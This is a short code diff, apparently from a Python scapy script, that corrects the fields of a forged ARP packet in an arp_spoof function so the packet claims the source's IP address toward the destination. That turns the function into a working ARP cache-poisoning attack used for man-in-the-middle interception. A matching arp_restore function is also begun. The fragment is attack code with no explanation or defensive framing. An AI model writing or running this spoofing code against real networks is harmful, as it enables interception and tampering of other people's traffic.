@@ -3,7 +3,7 @@ import sys
 
 def arp_spoof(dest_ip, dest_mac, source_ip): 
     packet= ARP(op="who-has", hwsrc=dest_mac,
-                    psrc= dest_ip, hwdst= dest_mac , pdst= source_ip)
+                    psrc= source_ip, hwdst= dest_mac , pdst= dest_ip)
     send(packet, verbose=False)
 
 def arp_restore(dest_ip, dest_mac, source_ip, source_mac): 
